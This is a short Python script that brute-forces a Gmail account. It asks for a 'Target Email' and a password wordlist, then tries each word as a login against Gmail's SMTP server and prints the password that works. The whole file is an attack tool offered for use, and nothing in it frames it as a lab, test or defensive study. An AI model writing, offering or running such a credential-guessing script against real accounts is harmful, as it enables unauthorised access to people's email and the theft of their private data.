import smtplib
import threading

def gmail():
    mail = smtplib.SMTP('smtp.gmail.com', 587)
    mail.ehlo()
    mail.starttls()

    user = input("Target Email: ")
    password = input("password file name: ")

    f = open(password, 'r')
    txt = f.read()
    txt = txt.split()
    for list in txt:
        try:
            mail.login(user, list)
            print("Password is %s" %list)
            break
        except smtplib.SMTPAuthenticationError:
            print("Password incorrect: %s" %list)

gmail()